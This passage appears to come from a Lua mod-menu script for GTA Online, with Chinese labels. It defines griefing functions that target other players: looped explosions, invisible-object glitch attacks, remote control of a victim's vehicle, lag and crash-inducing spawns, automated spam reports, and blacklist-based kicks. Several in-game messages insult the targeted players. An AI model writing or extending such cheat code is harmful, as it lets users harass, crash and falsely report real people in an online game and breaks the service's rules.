        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 24, 100.0, true, false, 0.0)
    end)
    GTLP(xunhaunshijian, "循环小爆炸", {"xbaozha"}, "", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 25, 100.0, true, false, 0.0)
    end)
    GTLP(xunhaunshijian, "循环大爆炸", {"dbaozha"}, "", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 6, 100.0, true, false, 0.0)
    end)
    GTLP(xunhaunshijian, "循环气场爆炸", {"waterloopv4"}, "", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 26, 100.0, true, false, 0.0)
    end)
    GTLP(xunhaunshijian, "循环闪闪发光", {"fgv2"}, "", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 22, 100.0, true, false, 0.0)
    end)
    GTLP(xunhaunshijian, "循环机枪爆炸", {"waterloopv5"}, "", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 45, 100.0, true, false, 0.0)
    end)
    GTLP(xunhaunshijian, "循环炸裂", {"fgv3"}, "", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 23, 100.0, true, false, 0.0)
    end)
    GTLP(xunhaunshijian, "循环烟雾", {"flameloop"}, "经典恶搞", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z - 1.0, 20, 1, true, false, 0, false)
    end)
    GTLP(xunhaunshijian,"循环电击枪", {"stungunloop"}, "在该玩家周围生成电击枪发射音效", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        for i = 1, 50 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
        end
        wait(100)
    end)
    GTLP(xunhaunshijian,"循环原子能枪", {"atomicgunloop"}, "在该玩家周围生成原子能枪发射音效", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z - 0.3, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_raypistol"), players.user_ped(), true, false, 1.0)
        wait(250)
    end)
    GTLP(xunhaunshijian, "随机循环", {"randomloop"}, "经典恶搞", function(on)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], math.random(0, 82), 1.0, true, false, 0.0)
    end)
	GTTG(xunhaunshijian,"循环举报", {"reportthenoob"}, "会造成卡顿", function(on)
		spam = on
		while spam do
			if pid ~= players.user() then
				menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reporthate " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportexploits " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportbugabuse " .. PLAYER.GET_PLAYER_NAME(pid))
			end
			wait()
		end
	end)
    local griefing = menu.list(jindianegao, "坏蛋选项", {}, "做一个坏孩纸")
    local glitch_player_list = menu.list(griefing, "鬼畜玩家", {"glitchdelay"}, "")
    local object_stuff = {
        names = {
            "摩天轮",
            "UFO",
            "水泥搅拌车",
            "脚手架",
            "车库门",
            "保龄球",
            "足球",
            "橘子",
            "特技坡道",
        },
        objects = {
            "prop_ld_ferris_wheel",
            "p_spinning_anus_s",
            "prop_staticmixer_01",
            "prop_towercrane_02a",
            "des_scaffolding_root",
            "prop_sm1_11_garaged",
            "stt_prop_stunt_bowling_ball",
            "stt_prop_stunt_soccer_ball",
            "prop_juicestand",
            "stt_prop_stunt_jump_l",
        }
    }
    local object_hash = util.joaat("prop_ld_ferris_wheel")
    GTLuaScript.list_select(glitch_player_list, "物体", {"glitchplayer"}, "选择鬼畜玩家使用的物体.", object_stuff.names, 1, function(index)
        object_hash = util.joaat(object_stuff.objects[index])
    end)
    GTluaScript.slider(glitch_player_list, "物体生成延迟", {"spawndelay"}, "", 150, 3000, 150, 10, function(amount)
        delay = amount
    end)
    local glitchPlayer
    glitchPlayer = player_toggle_loop(glitch_player_list, pid, "鬼畜玩家", {"glitchplayer"}, "被具有实体垃圾邮件保护功能的菜单所阻止.", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        if not players.exists(pid) then 
            gtoast("玩家不存在. :/")
            menu.set_value(glitchPlayer_toggle, false)
        util.stop_thread() end
        if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 1000.0 
        and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
            gtoast("玩家离得太远. :/")
            menu.set_value(glitchPlayer_toggle, false)
        return end
        local glitch_hash = object_hash
        local poopy_butt = util.joaat("rallytruck")
        request_model(glitch_hash)
        request_model(poopy_butt)
        local stupid_object = entities.create_object(glitch_hash, pos)
        local glitch_vehicle = entities.create_vehicle(poopy_butt, pos, 0)
        ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)
        ENTITY.SET_ENTITY_VISIBLE(glitch_vehicle, false)
        ENTITY.SET_ENTITY_INVINCIBLE(stupid_object, true)
        ENTITY.SET_ENTITY_COLLISION(stupid_object, true, true)
        ENTITY.APPLY_FORCE_TO_ENTITY(glitch_vehicle, 1, 0.0, 10, 10, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        wait(delay)
        entities.delete_by_handle(stupid_object)
        entities.delete_by_handle(glitch_vehicle)
        wait(delay)     
    end)
    local function RequestModel(hash, timeout)
        timeout = timeout or 3
        STREAMING.REQUEST_MODEL(hash)
        local end_time = os.time() + timeout
        repeat
            wait()
        until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
        return STREAMING.HAS_MODEL_LOADED(hash)
    end
    local glitch_veh_root = GT(griefing, "鬼畜载具")
    local obj_hash = util.joaat("prop_ld_ferris_wheel")
    GTLuaScript.list_select(glitch_veh_root, "模型选择", {"glitchplayer"}, "鬼畜玩家的模型是?", object_stuff.names, 1, function(index)
        obj_hash = util.joaat(object_stuff.objects[index])
    end)
    local glitchveh
    glitchveh = GTLP(glitch_veh_root, "开启", {"glitchvehicle"}, "请在实体模型选择完毕后，开启它！", function() -- credits to soul reaper for base concept
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = players.get_position(pid)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_model = players.get_vehicle_model(pid)
        local seat_count = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(veh_model)
        local object_hash = obj_hash
        RequestModel(object_hash)
        if not ENTITY.DOES_ENTITY_EXIST(ped) and PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            gtoast(players.get_name(pid) .. "太远或不在车辆中. :/")
            glitchveh.value = false
        util.stop_thread() end
        if not VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
            gtoast("没有座位了. :/")
            glitchveh.value = false
        util.stop_thread() end
        local glitch_obj = entities.create_object(object_hash, pos)
        local glitched_ped = PED.CREATE_RANDOM_PED(pos.x,pos.y,pos.z)
        local things = {glitched_ped, glitch_obj}
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitch_obj)
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(glitched_ped)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(glitch_obj, glitched_ped, 0, 0, 0, 0, 0, 0, 0, true, true, false, 0, true)
        for i, spawned_objects in things do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(spawned_objects)
            ENTITY.SET_ENTITY_VISIBLE(spawned_objects, false)
            ENTITY.SET_ENTITY_INVINCIBLE(spawned_objects, true)
        end
        for i = 0, seat_count -1 do
            if VEHICLE.ARE_ANY_VEHICLE_SEATS_FREE(player_veh) then
                local emptyseat = i
                for l = 1, 25 do
                    PED.SET_PED_INTO_VEHICLE(glitched_ped, player_veh, emptyseat)
                    ENTITY.SET_ENTITY_COLLISION(glitch_obj, true, true)
                    wait()
                end
            end
        end
        if glitched_ped ~= nil then -- added a 2nd stage here because it didnt want to delete sometimes, this solved that lol.
            entities.delete_by_handle(glitched_ped) 
        end
        if glitch_obj ~= nil then 
            entities.delete_by_handle(glitch_obj)
        end
    end)
    local glitchforcefield
    glitchforcefield = player_toggle_loop(griefing, pid, "大范围力场", {"forcefield"}, "被大部分菜单阻止", function()
        local glitch_hash = util.joaat("p_spinning_anus_s")
        request_model(glitch_hash)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local playerpos = ENTITY.GET_ENTITY_COORDS(ped, false)
        if not players.exists(pid) then 
            gtoast("玩家并不存在. :/")
            menu.set_value(glitchPlayer_toggle, false)
        util.stop_thread() end
        if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 1000.0 
        and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
            gtoast("玩家离得太远. :/")
            menu.set_value(glitchPlayer, false)
        return end
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            gtoast("玩家在载具里. :/")
            menu.set_value(glitchforcefield, false)
        return end
        local stupid_object = entities.create_object(glitch_hash, playerpos)
        ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)
        wait()
        entities.delete_by_handle(stupid_object)
        wait()    
    end)
    GTLP(jindianegao, "外星人入侵", {}, "", function(toggle)
        ufffo()
    end)
    GTLP(jindianegao, "外星人爆炸循环", {"ufoloop"}, "模拟外星人入侵", function()
        if players.exists(pid) then
            alien_explosion_loop(pid)
        end
    end)
    GTluaScript.slider(glitch_player_list, "物体生成延迟", {"spawndelay"}, "", 0, 3000, 50, 10, function(amount)
        delay = amount
    end)
    local glitchPlayer = false
    local glitchPlayer_toggle
    glitchPlayer_toggle = GTTG(glitch_player_list, "启用", {}, "", function(toggled)
        glitchPlayer = toggled
        while glitchPlayer do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                gtoast("这傻逼超出你的范围了 没法整. :/")
                menu.set_value(glitchPlayer_toggle, false)
            break end
            if not players.exists(pid) then 
                gtoast("找不到这傻逼,看看他还在战局吗?")
                menu.set_value(glitchPlayer_toggle, false)
            util.stop_thread() end
            local glitch_hash = object_hash
            local poopy_butt = util.joaat("rallytruck")
            request_model(glitch_hash)
            request_model(poopy_butt)
            local stupid_object = entities.create_object(glitch_hash, pos)
            local glitch_vehicle = entities.create_vehicle(poopy_butt, pos, 0)
            ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)
            ENTITY.SET_ENTITY_VISIBLE(glitch_vehicle, false)
            ENTITY.SET_ENTITY_INVINCIBLE(stupid_object, true)
            ENTITY.SET_ENTITY_COLLISION(stupid_object, true, true)
            ENTITY.APPLY_FORCE_TO_ENTITY(glitch_vehicle, 1, 0.0, 10, 10, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
            wait(delay)
            entities.delete_by_handle(stupid_object)
            entities.delete_by_handle(glitch_vehicle)
            wait(delay)    
        end
    end)
    local control_veh = false
    local control_veh_cmd
    control_veh_cmd = GTTG(jindianegao, "控制玩家车辆", {}, "必须是陆地上的车辆方可使用", function(toggle)
        control_veh = toggle
        while control_veh do 
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            local player_veh = PED.GET_VEHICLE_PED_IS_IN(ped)
            local class = VEHICLE.GET_VEHICLE_CLASS(player_veh)
            if not players.exists(pid) then util.stop_thread() end
            if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) > 1000.0 
            and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
                gtoast("玩家太远了. :/")
                GTluaScript.set_value(control_veh_cmd, false)
            return end
            if class == 15 then
                gtoast("玩家在直升机上. :/")
                GTluaScript.set_value(control_veh_cmd, false)
            break end
            if class == 16 then
                gtoast("玩家在飞机上. :/")
                GTluaScript.set_value(control_veh_cmd, false)
            return end
            if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
                if PAD.IS_CONTROL_PRESSED(0, 34) then
                    while not PAD.IS_CONTROL_RELEASED(0, 34) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 7, 100)
                        wait()
                    end
                elseif PAD.IS_CONTROL_PRESSED(0, 35) then
                    while not PAD.IS_CONTROL_RELEASED(0, 35) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 8, 100)
                        wait()
                    end
                elseif PAD.IS_CONTROL_PRESSED(0, 32) then
                    while not PAD.IS_CONTROL_RELEASED(0, 32) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 23, 100)
                        wait()
                    end
                elseif PAD.IS_CONTROL_PRESSED(0, 33) then
                    while not PAD.IS_CONTROL_RELEASED(0, 33) do
                        TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 28, 100)
                        wait()
                    end
                end
            else
                gtoast("玩家不在车内. :/")
                GTluaScript.set_value(control_veh_cmd, false)
            end
            wait()
        end
    end)
	GTTG(jindianegao, "原子弹轰炸", {"atomicbomb"}, "", function(c)
        yzd = c
        while yzd do
        for i = 0, 30 do 
            pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            for j = -2, 2 do 
                for k = -2, 2 do 
                    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
                    FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x + j, pos.y + j, pos.z + (30 - i), 29, 999999.99, true, false, 8)
                end
            end
            wait(20)
        end
    end
        yzd = false
    end)
    GTLP(jindianegao,"火箭雨", {'rockets'}, '', function()
        rain_rockets(pid, false)
        wait(500)
    end)
    player_toggle_loop(jindianegao,pid, "弹飞玩家", {}, "同样适用于载具", function() 
        local poopy_butt = util.joaat("adder")
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        pos.z -= 10
        request_model(poopy_butt)
        local vehicle = entities.create_vehicle(poopy_butt, pos, 0)
        ENTITY.SET_ENTITY_VISIBLE(vehicle, false)
        wait(250)
        if vehicle ~= 0 then
            ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, 0.0, 0.0, 100, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
            wait(250)
            entities.delete_by_handle(vehicle)
        end
    end)
    local glitchForcefield = false
    local glitchforcefield_toggle
    glitchforcefield_toggle = GTTG(jindianegao, "范围删除", {}, "启用后会将此玩家附近的模型删除", function(toggled)
        glitchForcefield = toggled
        local glitch_hash = util.joaat("p_spinning_anus_s")
        request_model(glitch_hash)
        while glitchForcefield do
            local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local playerpos = ENTITY.GET_ENTITY_COORDS(player, false)
            if PED.IS_PED_IN_ANY_VEHICLE(player, true) then
                gtoast("玩家在载具中. :/")
                GTluaScript.set_value(glitchforcefield_toggle, false);
            break end
            local stupid_object = entities.create_object(glitch_hash, playerpos)
            ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)
            ENTITY.SET_ENTITY_INVINCIBLE(stupid_object, true)
            ENTITY.SET_ENTITY_COLLISION(stupid_object, true, true)
            wait()
            entities.delete_by_handle(stupid_object)
            wait()    
        end
    end)
    GTLP(jindianegao, "烟雾掉帧", {"lag"}, "被少部分菜单检测", function()
        smokelagg(pid) 
    end)
    local YuleArmy = GT(jindianegao, "圣诞怪兽军队", {}, "")
    GTTG(YuleArmy, "圣诞怪兽", {"toggleyulemonster"}, "可能导致该玩家崩溃", function(on_toggle)
        if players.exists(pid) then
        if on_toggle then
            menu.trigger_commands("yulearmy" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
        else
            menu.trigger_commands("clearyules" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("superclear")
            end  
        end      
    end)
    GTluaScript.click_slider(YuleArmy, "生成圣诞怪兽军队", {"yulearmy"}, "", 1, 48, 48, 1, function(val)
        local player_Yule_army = {}
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        pos.y = pos.y - 5
        pos.z = pos.z + 1
        local Yule = util.joaat("U_M_M_YuleMonster")
        request_model(Yule)
        for i = 1, val do
        player_Yule_army[i] = entities.create_ped(28, Yule, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(player_Yule_army[i], true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(player_Yule_army[i], true)
        PED.SET_PED_COMPONENT_VARIATION(player_Yule_army[i], 0, 0, 1, 0)
        TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(player_Yule_army[i], ped, 0, -0.3, 0, 7.0, -1, 10, true)
        WEAPON.GIVE_WEAPON_TO_PED(player_Yule_army[i], util.joaat('WEAPON_CANDYCANE'),  9999, true, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(player_Yule_army[i], 20, true)
        PED.SET_PED_SHOOT_RATE(player_Yule_army[i], 1000)
        wait()
        end 
    end)
    GTAC(YuleArmy, "清除圣诞怪兽", {"clearyules"}, "", function()
        for i, ped in ipairs(entities.get_all_peds_as_handles()) do
            if PED.IS_PED_MODEL(ped, util.joaat("U_M_M_YuleMonster")) then
                entities.delete_by_handle(ped)
            end
        end
    end)
    GTLP(jindianegao, "让TA走路带火", {"footfire"}, "烫jiojio~", function()
        local coords = players.get_position(pid)
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 38, 0, false, false, 0, false)
        wait(65)
    end)
    GTAC(jindianegao, "禁用投掷物", {}, "禁止该玩家使用投掷物", function(toggle) 
        local baseball = util.joaat("weapon_ball")
        request_model(baseball)
        local id = PLAYER.PLAYER_PED_ID()
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        for i = 1, 60 do
            WEAPON.GIVE_WEAPON_TO_PED(id, baseball, 1, false, false)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(0,pos.x, pos.y, pos.z, pos.x, pos.y, pos.z + 5, 0, true, util.joaat("WEAPON_BALL"), PLAYER.PLAYER_PED_ID(), false, true, 0, ped, 0)
        end
        wait(500)
        MISC.CLEAR_AREA_OF_PROJECTILES(pos.x, pos.y, pos.z, 400, 0)
    end)
    GTAC(jindianegao, "送进监狱", {}, "将该玩家传送到博林布鲁克监狱", function()
        local my_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        local my_ped = PLAYER.GET_PLAYER_PED(players.user())
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, 1628.5234, 2570.5613, 45.56485, true, false, false, false)
        menu.trigger_commands("givesh " .. players.get_name(pid))
        menu.trigger_commands("summon " .. players.get_name(pid))
        menu.trigger_commands("invisibility on")
        menu.trigger_commands("otr")
        wait(5000)
        menu.trigger_commands("invisibility off")
        menu.trigger_commands("otr")
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(my_ped, my_pos.x, my_pos.y, my_pos.z)
    end)
    GTLP(jindianegao, "传送所有PED给玩家", {"toggletppeds"}, "", function (on_toggle)
            if on_toggle then
                TpAllPeds(pid)
            else
                TpAllPeds(pid)
            end
    end)
    GTLP(jindianegao, "传送所有载具给玩家", {"toggletppedstpvehs"}, "", function (on_toggle)
            if on_toggle then
                TpAllVehs(pid)
            else
                TpAllVehs(pid)
            end
    end)
    GTLP(jindianegao, "传送所有物体给玩家", {"tpobjs"}, "", function (on_toggle)
            if on_toggle then
                TpAllObjects(pid)
            else
                TpAllObjects(pid)
            end
    end)
    GTLP(jindianegao, "传送所有拾取物给玩家", {"tppickups"}, "", function (on_toggle)
            if on_toggle then
                TpAllPickups(pid)
            else
                TpAllPickups(pid)
            end
    end)
    GTLP(jindianegao, "假钱雨", {}, "", function ()
        local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
        Streamptfx('core')
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD( 'ent_brk_banknotes', tar1.x, tar1.y, tar1.z + 1, 0, 0, 0, 3.0, true, true, true)
    end)
    GTLP(jindianegao, "附近NPC跳伞", {"skydivepeds"}, "", function()
        if players.exists(pid) then
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
                all_peds = entities.get_all_peds_as_handles()
                player_ped = PLAYER.PLAYER_PED_ID()
                for k,ped in pairs(all_peds) do
                    if not PED.IS_PED_A_PLAYER(ped) then
                        TASK.TASK_SKY_DIVE(ped)
                    end
            end
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)
    GTAC(jindianegao, "关门放狗", {""}, "", function(on_click)
        sendog(pid)
    end)
	GTAC(jindianegao, "掉猴子", {""}, "", function()
        sendmonkey(pid)
    end)
        GTAC(jindianegao, "掉CXK", {""}, "", function()
        sendcxk(pid)
    end)
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    --
    function language_string(language)
        local language_table = {
          [0] = "美国",
          [1] = "法国",
          [2] = "德国",
          [3] = "意大利",
          [4] = "西班牙",
          [5] = "巴西",
          [6] = "波兰",
          [7] = "俄罗斯",
          [8] = "韩国",
          [9] = "中国(香港/台湾)",
          [10] = "日本",
          [11] = "墨西哥",
          [12] = "中国"
        }
        return language_table[language] or "Unknown"
    end
    friendly = GT(GTROOT, "友好选项", {"GTFriendly"}, "日行一善,行善积德")
    local rootPath = filesystem.scripts_dir().."GTLuaScript\\"
    local blacklistpath = rootPath.."\\Players\\gt_hmd.txt"
    blacklist = {}
    function split(str,delimiter)
        local dLen = string.len(delimiter)
        local newDeli = ''
        for i=1,dLen,1 do
            newDeli = newDeli .. "["..string.sub(delimiter,i,i).."]"
        end
        local locaStart,locaEnd = string.find(str,newDeli)
        local arr = {}
        local n = 1
        while locaStart ~= nil
        do
            if locaStart>0 then
                arr[n] = string.sub(str,1,locaStart-1)
                n = n + 1
            end
            str = string.sub(str,locaEnd+1,string.len(str))
            locaStart,locaEnd = string.find(str,newDeli)
        end
        if str ~= nil then
            arr[n] = str
        end
        return arr
    end 
    function addFiletoblcak()
        local f = assert(io.open(blacklistpath,'a+'))
        local line = f:read('*all')
        local bllist = split(line,"\n")
        for k, v in pairs(bllist) do
            local bl = {}
            bl = split(v,"----")
            table.insert(blacklist,bl)
        end
        f:close()
    end
    function addFile(Name,Rid)
        local f = assert(io.open(blacklistpath,"a"))
        f:write(Name..'----'..Rid..'\n')
        f:close()
        addFiletoblcak()
    end
    GTAC(GTROOT, "添加到作弊者数据库", {}, "可在GTLuaScript/Players/gt_hmd中删除黑名单列表", function()
        local focused_players = players.get_focused()
        if #focused_players == 0 then
            return
        end
        local pid = focused_players[1]
        local name = players.get_name(pid) 
        local scied = players.get_rockstar_id(pid)
        addFile(name,scied)
        notification("~r~已写入作弊者数据库",blue)
        notification("~r~已写入作弊者数据库",blue)
        blacklist = {}
        addFiletoblcak()
    end)
    GTTG(GTROOT,"作弊者数据库检测", {}, "", function(g) 
        gt = g
        if gt then
            for _, pid in players.list(false,true, true) do
                local name = players.get_name(pid) 
                local scied = tostring(players.get_rockstar_id(pid))
                for k,v in pairs(blacklist) do
                if pid ~= players.user() and players.exists(pid) then end
                    if v[2] == scied and not players.is_marked_as_modder(pid) then
                        menu.trigger_commands("kick" .. PLAYER.GET_PLAYER_NAME(pid))
                        if bolkp ~= pid then
                            bolkp = pid
                            notification("~r~检测黑名单\n名字： "..name.."\nRid: "..scied.." 正在踢出黑名单玩家",blue)
                        end
                    end
                end
            end
            return HANDLER_CONTINUE
        end
    end)
    if not filesystem.exists(blacklistpath) then
        local f = assert(io.open(blacklistpath,'a+'))
        f:close()
    else
        addFiletoblcak()
    end
    bReset = true
    cam_distance = 10
    override_distance = false
    function spectator(on,pid) -- 观看玩家
        if on then
            if players.exists(pid) then
                target = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(true, target)
                NETWORK.NETWORK_OVERRIDE_RECEIVE_RESTRICTIONS_ALL(false)
                HUD.SET_MINIMAP_IN_SPECTATOR_MODE(true, target)
                HUD.SET_BLIP_ALPHA(HUD.GET_MAIN_PLAYER_BLIP_ID(), 255)
                STREAMING.SET_FOCUS_ENTITY(target)
            if override_distance then
                CAM.SET_THIRD_PERSON_CAM_ORBIT_DISTANCE_LIMITS_THIS_UPDATE(1, cam_distance)
            end
            bReset = false
            end
        else
            bReset = true
            NETWORK.NETWORK_SET_IN_SPECTATOR_MODE(false, -1)
            NETWORK.NETWORK_OVERRIDE_RECEIVE_RESTRICTIONS_ALL(false)
            HUD.SET_MINIMAP_IN_SPECTATOR_MODE(false, -1)
            HUD.SET_BLIP_ALPHA(HUD.GET_MAIN_PLAYER_BLIP_ID(), 255)
            STREAMING.SET_FOCUS_ENTITY(players.user_ped())
        end
    end
    GTROOT:toggle("观看玩家", {}, "按V可切换所有视角(第一人称,第三人称,电影视角)",function(on) -- 玩家
        spectator(on,pid)
    end)
    GTTG(GTROOT,"上帝视角观看[天眼通]", {}, "空格升高视角,Ctrl下降视角", function(镜头开关)
        if 镜头开关 then
            启用镜头(pid)
        else
            禁用镜头()
        end
    end)
GTAC(friendly, "检测状态", {"checkstats"}, "", function()
    local rank = players.get_rank(pid)
    local money = players.get_money(pid)
    local kills = players.get_kills(pid)
    local deaths = players.get_deaths(pid)
    local kdratio = players.get_kd(pid)
    local language = language_string(players.get_language(pid))
    util.show_corner_help("名称 : "..players.get_name(pid).."\n国家: "..language.. "\n等级: "..rank.."\n金钱: "..string.format("%.2f", money/1000000).."M$".."\n杀人/死亡: "..kills.."/"..deaths.."\n比率: "..string.format("%.2f", kdratio))
end)
GTAC(friendly, "发送好友请求", {""}, "", function()
    menu.trigger_commands("befriend " .. PLAYER.GET_PLAYER_NAME(pid))
end, nil, nil, COMMANDPERM_FRIENDLY)
friendly:toggle_loop("给予金钱[新]", {}, "", function()
    request_model(util.joaat("s_m_y_fireman_01"))
    local coords = players.get_position(pid) coords.z += 0.5
    local peds = entities.create_ped(6, util.joaat("s_m_y_fireman_01"), coords ,ENTITY.GET_ENTITY_HEADING(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))) 
    sync_for_all_player(peds)
    ENTITY.SET_ENTITY_VISIBLE(peds, false)
    PED.SET_PED_MONEY(peds, 2000)
    PED.SET_PED_CONFIG_FLAG(peds, 392, true) 
    ENTITY.SET_ENTITY_HEALTH(peds, 0)
    wait(500)
    entities.delete_by_handle(peds)
end)
GTLP(friendly, "循环称赞", {}, "", function(on_toggle)
    if on_toggle then
        menu.trigger_commands("commendhelpful".. PLAYER.GET_PLAYER_NAME(pid))
        menu.trigger_commands("commendfriendly".. PLAYER.GET_PLAYER_NAME(pid))
    else
        menu.trigger_commands("commendhelpful".. PLAYER.GET_PLAYER_NAME(pid))
